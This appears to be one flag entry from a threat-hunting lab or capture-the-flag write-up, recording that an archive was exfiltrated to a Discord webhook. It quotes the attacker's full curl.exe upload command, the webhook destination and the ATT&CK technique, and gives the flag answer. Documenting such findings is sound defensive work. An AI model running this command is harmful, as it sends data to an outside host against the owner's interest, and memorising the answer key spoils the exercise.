### Flag 15 — Exfiltration: Exfiltration Platform

The archive was exfiltrated using `curl.exe` sent directly to a Discord webhook URL. Discord webhooks provide an HTTPS endpoint that accepts file uploads, making them a growing choice for data exfiltration — the traffic is encrypted, originates from a widely trusted domain, and is rarely blocked at the corporate firewall level.

| Field | Value |
|---|---|
| **Answer** | `Discord` |
| **Tool Used** | curl.exe |
| **Destination** | `https://discord.com/api/webhooks/14322472661518910004/...` |
| **Full Command** | `curl.exe -F file=@C:\ProgramData\WindowsCache\export-data.zip [webhook URL]` |
| **Timestamp** | Nov 19, 2025 — 19:09:21 UTC |
| **Technique** | Exfiltration Over Web Service (T1567) |

